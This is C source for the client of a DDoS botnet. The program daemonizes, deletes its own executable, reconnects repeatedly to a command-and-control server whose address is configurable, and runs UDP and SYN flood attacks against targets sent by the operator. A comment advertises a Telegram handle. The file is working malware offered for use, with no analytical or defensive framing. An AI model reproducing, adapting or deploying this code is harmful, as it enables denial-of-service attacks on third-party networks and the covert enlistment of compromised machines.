#define _GNU_SOURCE

#include "headers/attack_params.h"
#include "headers/daemon.h"
#include "headers/utils.h"
#include <pthread.h>
#include <linux/limits.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <ctype.h>
#include <time.h>
#include <errno.h>

#define CNC_IP "127.0.0.1" // IP OR DOMAIN | t.me/flylegit
#define BOT_PORT 7080
#define MAX_RETRIES 450
#define RETRY_DELAY 8

extern void udpplain_attack(attack_params *params);
extern void syn_attack(attack_params *params);

static pthread_t running_attack_tid = 0;
static attack_params running_attack_params = {0};

static void handle_command(const char *cmd, int sock) {
    if (!cmd || !*cmd) return;
    
    if (strncmp(cmd, "stop", 4) == 0 && (cmd[4] == 0 || cmd[4] == ' ')) {
        if (running_attack_tid) {
            running_attack_params.active = 0;
            pthread_join(running_attack_tid, NULL);
            running_attack_tid = 0;
        }
        return;
    }
    
    if (strncmp(cmd, "!kill", 5) == 0 && (cmd[5] == 0 || cmd[5] == ' ')) {
        killpg(getpgrp(), SIGKILL);
        return;
    }
    
    if (strncmp(cmd, "ping", 4) == 0 && (cmd[4] == 0 || cmd[4] == ' ')) {
        char pong[32];
        int len = snprintf(pong, sizeof(pong), "pong %s", get_arch());
        send(sock, pong, len > 0 ? len : 4, MSG_NOSIGNAL);
        return;
    }
    
    char type_buf[32], ip_buf[32], port_buf[8], time_buf[12];
    int nargs = sscanf(cmd, "%31s %31s %7s %11s", type_buf, ip_buf, port_buf, time_buf);
    if (nargs < 4) return;
    
    char *type = type_buf;
    if (type[0] == '!') type++;
    
    int port = atoi(port_buf);
    int dur = atoi(time_buf);
    if (port <= 0 || port > 65535 || dur <= 0) return;
    
    if (strcmp(type, "udpplain") != 0 && strcmp(type, "syn") != 0) return;
    
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    if (inet_pton(AF_INET, ip_buf, &sin.sin_addr) <= 0) return;
    
    attack_params params;
    memset(&params, 0, sizeof(params));
    params.target_addr = sin;
    params.duration = dur;
    params.psize = 512;
    params.psize_min = 512;
    params.psize_max = 512;
    params.active = 1;
    
    void (*func)(attack_params*) = (strcmp(type, "udpplain") == 0) ? udpplain_attack : syn_attack;
    
    if (running_attack_tid) {
        running_attack_params.active = 0;
        pthread_join(running_attack_tid, NULL);
        running_attack_tid = 0;
    }
    
    running_attack_params = params;
    pthread_t tid;
    if (pthread_create(&tid, NULL, (void*(*)(void*))func, &running_attack_params) == 0) {
        running_attack_tid = tid;
    }
}

int main(int argc, char** argv) {
    signal(SIGPIPE, SIG_IGN);
    daemonize(argc, argv);
    
    char self_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
    if (len > 0) {
        self_path[len] = 0;
        unlink(self_path);
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    server_addr.sin_addr.s_addr = inet_addr(CNC_IP);
    
    char group[64] = "default";
    if (argc > 1) {
        strncpy(group, argv[1], sizeof(group)-1);
        group[sizeof(group)-1] = 0;
    }
    
    int reconnect = 0;
    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            if (++reconnect >= MAX_RETRIES) _exit(42);
            sleep(RETRY_DELAY);
            continue;
        }
        
        int opt = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) != 0) {
            if (++reconnect >= MAX_RETRIES) {
                close(sock);
                _exit(42);
            }
            close(sock);
            sleep(RETRY_DELAY);
            continue;
        }
        
        reconnect = 0;
        const char *arch = get_arch();
        char idmsg[128];
        int msglen = snprintf(idmsg, sizeof(idmsg), "%s %s", arch, group);
        if (msglen > 0) send(sock, idmsg, msglen, MSG_NOSIGNAL);
        
        char cmd[512];
        struct timeval tv;
        while (1) {
            fd_set readfds;
            tv.tv_sec = 60;
            tv.tv_usec = 0;
            FD_ZERO(&readfds);
            FD_SET(sock, &readfds);
            
            int sel = select(sock+1, &readfds, NULL, NULL, &tv);
            if (sel <= 0) break;
            
            ssize_t n = recv(sock, cmd, sizeof(cmd)-1, MSG_NOSIGNAL);
            if (n <= 0) break;
            
            cmd[n] = 0;
            handle_command(cmd, sock);
        }
        
        close(sock);
        sleep(1);
    }
    return 0;
}
